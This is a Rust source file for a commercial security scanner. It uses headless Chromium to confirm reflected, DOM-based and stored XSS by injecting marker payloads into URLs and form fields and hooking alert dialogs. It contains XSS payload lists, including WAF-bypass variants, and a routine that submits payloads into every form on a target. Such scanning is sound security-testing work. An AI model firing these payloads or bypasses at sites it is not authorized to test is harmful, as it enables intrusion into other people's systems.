// Copyright (c) 2026 Bountyy Oy. All rights reserved.
// This software is proprietary and confidential.

//! Chromium-based XSS Scanner with Real JavaScript Execution Detection
//!
//! This scanner uses a real headless Chromium browser to detect XSS by:
//! 1. Intercepting JavaScript dialogs (alert, confirm, prompt)
//! 2. Monitoring console.log for XSS markers
//! 3. Submitting forms with XSS payloads and detecting stored XSS
//! 4. Testing DOM-based XSS with URL fragment/query payloads

use crate::http_client::HttpClient;
use crate::types::{Confidence, ScanConfig, ScanMode, Severity, Vulnerability};
use anyhow::{Context, Result};
use headless_chrome::{Browser, LaunchOptions};
use std::collections::HashSet;
use std::sync::{Arc, Mutex};
use std::time::Duration;
use tracing::{debug, info, warn};

/// XSS Detection result from Chromium
#[derive(Debug, Clone)]
pub struct XssDetectionResult {
    pub xss_triggered: bool,
    pub trigger_type: XssTriggerType,
    pub payload: String,
    pub dialog_message: Option<String>,
    pub console_output: Option<String>,
    pub url: String,
}

/// How the XSS was triggered
#[derive(Debug, Clone, PartialEq)]
pub enum XssTriggerType {
    AlertDialog,
    ConfirmDialog,
    PromptDialog,
    ConsoleLog,
    DomExecution,
    None,
}

/// Chromium-based XSS Scanner
pub struct ChromiumXssScanner {
    http_client: Arc<HttpClient>,
    confirmed_vulns: Arc<Mutex<HashSet<String>>>,
    browser_timeout: Duration,
}

impl ChromiumXssScanner {
    pub fn new(http_client: Arc<HttpClient>) -> Self {
        Self {
            http_client,
            confirmed_vulns: Arc::new(Mutex::new(HashSet::new())),
            browser_timeout: Duration::from_secs(30),
        }
    }

    /// Main scan entry point
    pub async fn scan(
        &self,
        url: &str,
        config: &ScanConfig,
    ) -> Result<(Vec<Vulnerability>, usize)> {
        // Mandatory authorization check
        if !crate::license::verify_scan_authorized() {
            return Ok((Vec::new(), 0));
        }
        if !crate::signing::is_scan_authorized() {
            warn!("Chromium XSS scan blocked: No valid scan authorization");
            return Ok((Vec::new(), 0));
        }

        info!("[Chromium-XSS] Starting real browser XSS scan for: {}", url);

        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        // Check if headless browser is available
        if !Self::is_browser_available().await {
            warn!("[Chromium-XSS] Chrome/Chromium not available, falling back to HTTP-based detection");
            return Ok((Vec::new(), 0));
        }

        // Phase 1: Reflected XSS via URL parameters
        let (reflected_vulns, reflected_tests) = self.scan_reflected_xss(url, config).await?;
        vulnerabilities.extend(reflected_vulns);
        tests_run += reflected_tests;

        // Phase 2: DOM-based XSS via hash/fragment
        let (dom_vulns, dom_tests) = self.scan_dom_xss(url, config).await?;
        vulnerabilities.extend(dom_vulns);
        tests_run += dom_tests;

        // Phase 3: Stored XSS via form submission
        let (stored_vulns, stored_tests) = self.scan_stored_xss(url, config).await?;
        vulnerabilities.extend(stored_vulns);
        tests_run += stored_tests;

        info!(
            "[Chromium-XSS] Scan complete: {} confirmed XSS vulnerabilities, {} tests run",
            vulnerabilities.len(),
            tests_run
        );

        Ok((vulnerabilities, tests_run))
    }

    /// Check if Chrome/Chromium browser is available
    async fn is_browser_available() -> bool {
        tokio::task::spawn_blocking(|| {
            let options = match LaunchOptions::default_builder()
                .headless(true)
                .build() {
                    Ok(o) => o,
                    Err(_) => return false,
                };
            Browser::new(options).is_ok()
        })
        .await
        .unwrap_or(false)
    }

    /// Scan for reflected XSS via URL parameters
    async fn scan_reflected_xss(
        &self,
        url: &str,
        config: &ScanConfig,
    ) -> Result<(Vec<Vulnerability>, usize)> {
        debug!("[Chromium-XSS] Testing reflected XSS");

        let mut vulnerabilities = Vec::new();
        let url_owned = url.to_string();
        let timeout = self.browser_timeout;
        let mode = config.scan_mode.clone();

        // Get XSS payloads based on scan mode
        let payloads = self.get_xss_payloads(&mode);
        let tests_run = payloads.len();

        let results = tokio::task::spawn_blocking(move || {
            Self::test_reflected_xss_sync(&url_owned, &payloads, timeout)
        })
        .await
        .context("Reflected XSS test task panicked")??;

        for result in results {
            if result.xss_triggered {
                let vuln = self.create_vulnerability(
                    &result,
                    "Reflected XSS (Confirmed)",
                    "XSS payload executed in browser context. JavaScript alert/console triggered.",
                )?;
                vulnerabilities.push(vuln);
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Synchronous reflected XSS testing with real browser
    fn test_reflected_xss_sync(
        url: &str,
        payloads: &[String],
        timeout: Duration,
    ) -> Result<Vec<XssDetectionResult>> {
        let browser = Browser::new(
            LaunchOptions::default_builder()
                .headless(true)
                .idle_browser_timeout(timeout)
                .build()
                .map_err(|e| anyhow::anyhow!("Browser launch error: {}", e))?,
        )?;

        let mut results = Vec::new();

        for payload in payloads {
            // Create unique marker for this test
            let marker = format!("XSS_{}", uuid::Uuid::new_v4().to_string()[..8].to_uppercase());
            let test_payload = payload.replace("MARKER", &marker);

            // Build test URL with payload
            let test_url = if url.contains('?') {
                format!("{}&xss={}", url, urlencoding::encode(&test_payload))
            } else {
                format!("{}?xss={}", url, urlencoding::encode(&test_payload))
            };

            match Self::test_single_payload(&browser, &test_url, &marker, timeout) {
                Ok(result) => {
                    if result.xss_triggered {
                        info!("[Chromium-XSS] CONFIRMED XSS: {} via {:?}", test_url, result.trigger_type);
                        results.push(result);
                        break; // One confirmed XSS is enough
                    }
                }
                Err(e) => {
                    debug!("[Chromium-XSS] Test failed for payload: {}", e);
                }
            }
        }

        Ok(results)
    }

    /// Test a single payload and detect XSS execution
    fn test_single_payload(
        browser: &Browser,
        url: &str,
        marker: &str,
        _timeout: Duration,
    ) -> Result<XssDetectionResult> {
        let tab = browser.new_tab()?;

        // Set up JavaScript dialog handler BEFORE navigation
        // This intercepts alert(), confirm(), prompt()
        let setup_js = format!(r#"
            // Store original functions
            window.__originalAlert = window.alert;
            window.__originalConfirm = window.confirm;
            window.__originalPrompt = window.prompt;
            window.__xssMarker = '{}';
            window.__xssTriggered = false;
            window.__xssTriggerType = 'none';
            window.__xssMessage = '';

            // Override alert
            window.alert = function(msg) {{
                window.__xssMessage = String(msg);
                if (String(msg).includes(window.__xssMarker)) {{
                    window.__xssTriggered = true;
                    window.__xssTriggerType = 'alert';
                }}
                // Don't show actual dialog - just log
                console.log('[XSS-DETECTED] alert:', msg);
            }};

            // Override confirm
            window.confirm = function(msg) {{
                window.__xssMessage = String(msg);
                if (String(msg).includes(window.__xssMarker)) {{
                    window.__xssTriggered = true;
                    window.__xssTriggerType = 'confirm';
                }}
                console.log('[XSS-DETECTED] confirm:', msg);
                return true;
            }};

            // Override prompt
            window.prompt = function(msg, def) {{
                window.__xssMessage = String(msg);
                if (String(msg).includes(window.__xssMarker)) {{
                    window.__xssTriggered = true;
                    window.__xssTriggerType = 'prompt';
                }}
                console.log('[XSS-DETECTED] prompt:', msg);
                return def || '';
            }};

            // Also check for execution via onerror, onload, etc.
            window.addEventListener('error', function(e) {{
                console.log('[XSS-ERROR]', e.message);
            }});

            console.log('[XSS-SCANNER] Interception active, marker:', window.__xssMarker);
        "#, marker);

        // First navigate to about:blank and inject our hooks
        tab.navigate_to("about:blank")?;
        std::thread::sleep(Duration::from_millis(100));

        // Inject our XSS detection hooks
        tab.evaluate(&setup_js, false)?;

        // Now navigate to the actual test URL
        tab.navigate_to(url)?;

        // Wait for page load and potential XSS execution
        std::thread::sleep(Duration::from_secs(3));

        // Check if XSS was triggered
        let check_result = tab.evaluate(r#"
            JSON.stringify({
                triggered: window.__xssTriggered || false,
                type: window.__xssTriggerType || 'none',
                message: window.__xssMessage || ''
            })
        "#, false)?;

        let mut result = XssDetectionResult {
            xss_triggered: false,
            trigger_type: XssTriggerType::None,
            payload: url.to_string(),
            dialog_message: None,
            console_output: None,
            url: url.to_string(),
        };

        if let Some(value) = check_result.value {
            if let Some(json_str) = value.as_str() {
                if let Ok(parsed) = serde_json::from_str::<serde_json::Value>(json_str) {
                    result.xss_triggered = parsed.get("triggered").and_then(|v| v.as_bool()).unwrap_or(false);

                    let trigger_str = parsed.get("type").and_then(|v| v.as_str()).unwrap_or("none");
                    result.trigger_type = match trigger_str {
                        "alert" => XssTriggerType::AlertDialog,
                        "confirm" => XssTriggerType::ConfirmDialog,
                        "prompt" => XssTriggerType::PromptDialog,
                        _ => XssTriggerType::None,
                    };

                    result.dialog_message = parsed.get("message")
                        .and_then(|v| v.as_str())
                        .map(|s| s.to_string());
                }
            }
        }

        // Also check if marker appears in DOM (for cases where alert might be blocked)
        if !result.xss_triggered {
            let dom_check = format!(
                "document.body && document.body.innerHTML.includes('{}')",
                marker
            );
            if let Ok(dom_result) = tab.evaluate(&dom_check, false) {
                if dom_result.value.and_then(|v| v.as_bool()) == Some(true) {
                    // Check if it's in a script or event handler context
                    let script_check = format!(
                        "Array.from(document.querySelectorAll('script')).some(s => s.textContent.includes('{}')) || document.body.innerHTML.match(/on\\w+=.*{}/i)",
                        marker, marker
                    );
                    if let Ok(script_result) = tab.evaluate(&script_check, false) {
                        if script_result.value.and_then(|v| v.as_bool()) == Some(true) {
                            result.xss_triggered = true;
                            result.trigger_type = XssTriggerType::DomExecution;
                        }
                    }
                }
            }
        }

        Ok(result)
    }

    /// Scan for DOM-based XSS via URL hash/fragment
    async fn scan_dom_xss(
        &self,
        url: &str,
        config: &ScanConfig,
    ) -> Result<(Vec<Vulnerability>, usize)> {
        debug!("[Chromium-XSS] Testing DOM-based XSS via hash");

        let mut vulnerabilities = Vec::new();
        let url_owned = url.to_string();
        let timeout = self.browser_timeout;

        // DOM XSS payloads targeting hash/fragment
        let payloads = vec![
            "#<img src=x onerror=alert('MARKER')>".to_string(),
            "#<svg onload=alert('MARKER')>".to_string(),
            "#javascript:alert('MARKER')".to_string(),
            "#\"><script>alert('MARKER')</script>".to_string(),
            "#'><img src=x onerror=alert('MARKER')>".to_string(),
        ];

        let tests_run = payloads.len();

        let results = tokio::task::spawn_blocking(move || {
            Self::test_dom_xss_sync(&url_owned, &payloads, timeout)
        })
        .await
        .context("DOM XSS test task panicked")??;

        for result in results {
            if result.xss_triggered {
                let vuln = self.create_vulnerability(
                    &result,
                    "DOM-based XSS (Confirmed)",
                    "DOM XSS via URL fragment. JavaScript executed when parsing location.hash.",
                )?;
                vulnerabilities.push(vuln);
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Synchronous DOM XSS testing
    fn test_dom_xss_sync(
        url: &str,
        payloads: &[String],
        timeout: Duration,
    ) -> Result<Vec<XssDetectionResult>> {
        let browser = Browser::new(
            LaunchOptions::default_builder()
                .headless(true)
                .idle_browser_timeout(timeout)
                .build()
                .map_err(|e| anyhow::anyhow!("Browser launch error: {}", e))?,
        )?;

        let mut results = Vec::new();

        for payload in payloads {
            let marker = format!("DOMXSS_{}", uuid::Uuid::new_v4().to_string()[..8].to_uppercase());
            let test_payload = payload.replace("MARKER", &marker);
            let test_url = format!("{}{}", url.trim_end_matches('#'), test_payload);

            match Self::test_single_payload(&browser, &test_url, &marker, timeout) {
                Ok(result) => {
                    if result.xss_triggered {
                        info!("[Chromium-XSS] CONFIRMED DOM XSS: {}", test_url);
                        results.push(result);
                        break;
                    }
                }
                Err(e) => {
                    debug!("[Chromium-XSS] DOM XSS test failed: {}", e);
                }
            }
        }

        Ok(results)
    }

    /// Scan for stored XSS via form submission
    pub async fn scan_stored_xss(
        &self,
        url: &str,
        config: &ScanConfig,
    ) -> Result<(Vec<Vulnerability>, usize)> {
        debug!("[Chromium-XSS] Testing stored XSS via form submission");

        let mut vulnerabilities = Vec::new();
        let url_owned = url.to_string();
        let timeout = self.browser_timeout;
        let mode = config.scan_mode.clone();

        let results = tokio::task::spawn_blocking(move || {
            Self::test_stored_xss_sync(&url_owned, timeout, &mode)
        })
        .await
        .context("Stored XSS test task panicked")??;

        let tests_run = results.len().max(1);

        for result in results {
            if result.xss_triggered {
                let vuln = self.create_vulnerability(
                    &result,
                    "Stored XSS (Confirmed)",
                    "Stored XSS via form submission. Payload persisted and executed on page reload.",
                )?;
                vulnerabilities.push(vuln);
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Synchronous stored XSS testing with form submission
    fn test_stored_xss_sync(
        url: &str,
        timeout: Duration,
        _mode: &ScanMode,
    ) -> Result<Vec<XssDetectionResult>> {
        let browser = Browser::new(
            LaunchOptions::default_builder()
                .headless(true)
                .idle_browser_timeout(timeout)
                .build()
                .map_err(|e| anyhow::anyhow!("Browser launch error: {}", e))?,
        )?;

        let tab = browser.new_tab()?;
        let mut results = Vec::new();

        // Create unique marker
        let marker = format!("STOREDXSS_{}", uuid::Uuid::new_v4().to_string()[..8].to_uppercase());

        // XSS payloads for stored XSS testing
        let payloads = vec![
            format!("<script>alert('{}')</script>", marker),
            format!("<img src=x onerror=alert('{}')>", marker),
            format!("<svg onload=alert('{}')>", marker),
            format!("<body onload=alert('{}')>", marker),
            format!("'><script>alert('{}')</script>", marker),
            format!("\"><script>alert('{}')</script>", marker),
        ];

        // Set up XSS detection before navigation
        let setup_js = format!(r#"
            window.__xssMarker = '{}';
            window.__xssTriggered = false;
            window.__xssTriggerType = 'none';
            window.__xssMessage = '';

            window.alert = function(msg) {{
                window.__xssMessage = String(msg);
                if (String(msg).includes(window.__xssMarker)) {{
                    window.__xssTriggered = true;
                    window.__xssTriggerType = 'alert';
                }}
                console.log('[STORED-XSS-DETECTED] alert:', msg);
            }};

            window.confirm = function(msg) {{
                window.__xssMessage = String(msg);
                if (String(msg).includes(window.__xssMarker)) {{
                    window.__xssTriggered = true;
                    window.__xssTriggerType = 'confirm';
                }}
                return true;
            }};

            window.prompt = function(msg) {{
                window.__xssMessage = String(msg);
                if (String(msg).includes(window.__xssMarker)) {{
                    window.__xssTriggered = true;
                    window.__xssTriggerType = 'prompt';
                }}
                return '';
            }};
        "#, marker);

        // Navigate to page
        tab.navigate_to(url)?;
        tab.wait_until_navigated()?;
        std::thread::sleep(Duration::from_secs(2));

        // Find forms on the page
        let forms_js = r#"
            (function() {
                const forms = [];
                document.querySelectorAll('form').forEach((form, idx) => {
                    const inputs = [];
                    form.querySelectorAll('input:not([type="hidden"]):not([type="submit"]):not([type="button"]), textarea').forEach(el => {
                        if (el.type !== 'checkbox' && el.type !== 'radio' && el.type !== 'file') {
                            inputs.push({
                                name: el.name || el.id || '',
                                type: el.type || el.tagName.toLowerCase(),
                                selector: el.name ? `[name="${el.name}"]` : (el.id ? `#${el.id}` : null)
                            });
                        }
                    });
                    if (inputs.length > 0) {
                        forms.push({
                            index: idx,
                            action: form.action || window.location.href,
                            method: form.method || 'POST',
                            inputs: inputs
                        });
                    }
                });
                return JSON.stringify(forms);
            })()
        "#;

        let forms_result = tab.evaluate(forms_js, false)?;
        let forms: Vec<serde_json::Value> = if let Some(value) = forms_result.value {
            if let Some(json_str) = value.as_str() {
                serde_json::from_str(json_str).unwrap_or_default()
            } else {
                Vec::new()
            }
        } else {
            Vec::new()
        };

        info!("[Chromium-XSS] Found {} forms to test for stored XSS", forms.len());

        // Test each form with each payload
        for form in &forms {
            let inputs = form.get("inputs").and_then(|v| v.as_array()).cloned().unwrap_or_default();

            if inputs.is_empty() {
                continue;
            }

            for payload in &payloads {
                // Inject our detection hooks
                tab.evaluate(&setup_js, false)?;

                // Fill form inputs with XSS payload
                for input in &inputs {
                    if let Some(selector) = input.get("selector").and_then(|v| v.as_str()) {
                        if !selector.is_empty() {
                            let fill_js = format!(
                                r#"
                                (function() {{
                                    const el = document.querySelector('{}');
                                    if (el) {{
                                        el.value = '{}';
                                        el.dispatchEvent(new Event('input', {{ bubbles: true }}));
                                        el.dispatchEvent(new Event('change', {{ bubbles: true }}));
                                        return true;
                                    }}
                                    return false;
                                }})()
                                "#,
                                selector.replace("'", "\\'"),
                                payload.replace("'", "\\'").replace("\\", "\\\\")
                            );
                            let _ = tab.evaluate(&fill_js, false);
                        }
                    }
                }

                // Submit the form
                let form_idx = form.get("index").and_then(|v| v.as_i64()).unwrap_or(0);
                let submit_js = format!(
                    r#"
                    (function() {{
                        const form = document.querySelectorAll('form')[{}];
                        if (form) {{
                            const submitBtn = form.querySelector('[type="submit"], button:not([type="button"])');
                            if (submitBtn) {{
                                submitBtn.click();
                                return 'clicked';
                            }} else {{
                                form.submit();
                                return 'submitted';
                            }}
                        }}
                        return 'no_form';
                    }})()
                    "#,
                    form_idx
                );

                let submit_result = tab.evaluate(&submit_js, false)?;
                debug!("[Chromium-XSS] Form submit result: {:?}", submit_result.value);

                // Wait for submission and page update
                std::thread::sleep(Duration::from_secs(3));

                // Re-inject detection hooks after form submission (page may have changed)
                let _ = tab.evaluate(&setup_js, false);

                // Wait a bit more for any XSS to trigger
                std::thread::sleep(Duration::from_secs(1));

                // Check if XSS was triggered
                let check_result = tab.evaluate(r#"
                    JSON.stringify({
                        triggered: window.__xssTriggered || false,
                        type: window.__xssTriggerType || 'none',
                        message: window.__xssMessage || ''
                    })
                "#, false)?;

                if let Some(value) = check_result.value {
                    if let Some(json_str) = value.as_str() {
                        if let Ok(parsed) = serde_json::from_str::<serde_json::Value>(json_str) {
                            let triggered = parsed.get("triggered").and_then(|v| v.as_bool()).unwrap_or(false);

                            if triggered {
                                let trigger_str = parsed.get("type").and_then(|v| v.as_str()).unwrap_or("none");
                                let trigger_type = match trigger_str {
                                    "alert" => XssTriggerType::AlertDialog,
                                    "confirm" => XssTriggerType::ConfirmDialog,
                                    "prompt" => XssTriggerType::PromptDialog,
                                    _ => XssTriggerType::DomExecution,
                                };

                                info!("[Chromium-XSS] CONFIRMED STORED XSS via form submission!");

                                results.push(XssDetectionResult {
                                    xss_triggered: true,
                                    trigger_type,
                                    payload: payload.clone(),
                                    dialog_message: parsed.get("message").and_then(|v| v.as_str()).map(|s| s.to_string()),
                                    console_output: None,
                                    url: url.to_string(),
                                });

                                // Found stored XSS, no need to test more payloads for this form
                                break;
                            }
                        }
                    }
                }

                // Navigate back to the original page for next test
                tab.navigate_to(url)?;
                tab.wait_until_navigated()?;
                std::thread::sleep(Duration::from_secs(1));
            }

            // If we found XSS in this form, move to next form
            if !results.is_empty() {
                break;
            }
        }

        // Also check if the payload appears in the page after reload (for persistent XSS)
        if results.is_empty() {
            // Reload the page with fresh detection hooks
            tab.navigate_to(url)?;
            tab.wait_until_navigated()?;

            // Inject detection hooks
            let _ = tab.evaluate(&setup_js, false);

            std::thread::sleep(Duration::from_secs(3));

            // Check if stored payload triggered XSS
            let check_result = tab.evaluate(r#"
                JSON.stringify({
                    triggered: window.__xssTriggered || false,
                    type: window.__xssTriggerType || 'none',
                    message: window.__xssMessage || ''
                })
            "#, false)?;

            if let Some(value) = check_result.value {
                if let Some(json_str) = value.as_str() {
                    if let Ok(parsed) = serde_json::from_str::<serde_json::Value>(json_str) {
                        let triggered = parsed.get("triggered").and_then(|v| v.as_bool()).unwrap_or(false);

                        if triggered {
                            let trigger_str = parsed.get("type").and_then(|v| v.as_str()).unwrap_or("none");
                            let trigger_type = match trigger_str {
                                "alert" => XssTriggerType::AlertDialog,
                                "confirm" => XssTriggerType::ConfirmDialog,
                                "prompt" => XssTriggerType::PromptDialog,
                                _ => XssTriggerType::DomExecution,
                            };

                            info!("[Chromium-XSS] CONFIRMED PERSISTENT STORED XSS!");

                            results.push(XssDetectionResult {
                                xss_triggered: true,
                                trigger_type,
                                payload: format!("Stored XSS marker: {}", marker),
                                dialog_message: parsed.get("message").and_then(|v| v.as_str()).map(|s| s.to_string()),
                                console_output: None,
                                url: url.to_string(),
                            });
                        }
                    }
                }
            }
        }

        Ok(results)
    }

    /// Create vulnerability from detection result
    fn create_vulnerability(
        &self,
        result: &XssDetectionResult,
        vuln_type: &str,
        description: &str,
    ) -> Result<Vulnerability> {
        let trigger_desc = match result.trigger_type {
            XssTriggerType::AlertDialog => "JavaScript alert() dialog",
            XssTriggerType::ConfirmDialog => "JavaScript confirm() dialog",
            XssTriggerType::PromptDialog => "JavaScript prompt() dialog",
            XssTriggerType::ConsoleLog => "console.log() output",
            XssTriggerType::DomExecution => "DOM script execution",
            XssTriggerType::None => "Unknown trigger",
        };

        let evidence = format!(
            "XSS Confirmed via: {}\nPayload: {}\nDialog Message: {}\nURL: {}",
            trigger_desc,
            result.payload,
            result.dialog_message.as_deref().unwrap_or("N/A"),
            result.url
        );

        Ok(Vulnerability {
            id: format!("chromium_xss_{}", uuid::Uuid::new_v4()),
            vuln_type: vuln_type.to_string(),
            severity: Severity::High,
            confidence: Confidence::High,
            category: "Injection".to_string(),
            url: result.url.clone(),
            parameter: None,
            payload: result.payload.clone(),
            description: format!(
                "{}. Trigger: {}. This is a CONFIRMED vulnerability detected via real browser execution.",
                description, trigger_desc
            ),
            evidence: Some(evidence),
            cwe: "CWE-79".to_string(),
            cvss: 7.5,
            verified: true,
            false_positive: false,
            remediation: self.get_remediation(&result.trigger_type),
            discovered_at: chrono::Utc::now().to_rfc3339(),
            ml_data: None,
        })
    }

    /// Get remediation advice
    fn get_remediation(&self, _trigger_type: &XssTriggerType) -> String {
        "1. Encode all user input before rendering in HTML context\n\
         2. Use Content Security Policy (CSP) to prevent inline script execution\n\
         3. Use HTTP-only cookies to prevent cookie theft\n\
         4. Implement input validation and sanitization\n\
         5. Use framework-provided encoding functions (e.g., React's JSX auto-escaping)\n\
         6. Consider using DOMPurify for sanitizing HTML content".to_string()
    }

    /// Get XSS payloads based on scan mode
    fn get_xss_payloads(&self, mode: &ScanMode) -> Vec<String> {
        let base_payloads = vec![
            // Basic payloads with MARKER placeholder
            "<script>alert('MARKER')</script>".to_string(),
            "<img src=x onerror=alert('MARKER')>".to_string(),
            "<svg onload=alert('MARKER')>".to_string(),
            "<body onload=alert('MARKER')>".to_string(),
            "'\"><script>alert('MARKER')</script>".to_string(),
            "\"><img src=x onerror=alert('MARKER')>".to_string(),
            "javascript:alert('MARKER')".to_string(),
        ];

        let advanced_payloads = vec![
            // Event handlers
            "<div onmouseover=alert('MARKER')>hover</div>".to_string(),
            "<input onfocus=alert('MARKER') autofocus>".to_string(),
            "<details open ontoggle=alert('MARKER')>".to_string(),
            "<marquee onstart=alert('MARKER')>".to_string(),

            // SVG variants
            "<svg><script>alert('MARKER')</script></svg>".to_string(),
            "<svg><animate onbegin=alert('MARKER')>".to_string(),

            // Template literals (backtick)
            "<script>alert`MARKER`</script>".to_string(),
            "<img src=x onerror=alert`MARKER`>".to_string(),

            // Case variations
            "<ScRiPt>alert('MARKER')</sCrIpT>".to_string(),
            "<IMG SRC=x ONERROR=alert('MARKER')>".to_string(),

            // Encoding bypass
            "<script>\\u0061lert('MARKER')</script>".to_string(),
        ];

        let waf_bypass_payloads = vec![
            // Null byte injection
            "<scr\x00ipt>alert('MARKER')</script>".to_string(),

            // Comment injection
            "<script>/**/alert('MARKER')/**/</script>".to_string(),

            // Double encoding
            "%253Cscript%253Ealert('MARKER')%253C/script%253E".to_string(),

            // HTML entity encoding
            "&#60;script&#62;alert('MARKER')&#60;/script&#62;".to_string(),

            // Constructor bypasses
            "<img src=x onerror=[].constructor.constructor('alert(`MARKER`)')()>".to_string(),
        ];

        match mode {
            ScanMode::Fast | ScanMode::Normal => base_payloads,
            ScanMode::Thorough | ScanMode::Intelligent => {
                let mut all = base_payloads;
                all.extend(advanced_payloads);
                all
            }
            ScanMode::Insane => {
                let mut all = base_payloads;
                all.extend(advanced_payloads);
                all.extend(waf_bypass_payloads);
                all
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_xss_payloads() {
        let http_client = Arc::new(HttpClient::new().unwrap());
        let scanner = ChromiumXssScanner::new(http_client);

        let payloads = scanner.get_xss_payloads(&ScanMode::Normal);
        assert!(!payloads.is_empty());
        assert!(payloads.iter().all(|p| p.contains("MARKER")));
    }

    #[test]
    fn test_trigger_types() {
        assert_eq!(XssTriggerType::AlertDialog, XssTriggerType::AlertDialog);
        assert_ne!(XssTriggerType::AlertDialog, XssTriggerType::ConfirmDialog);
    }
}
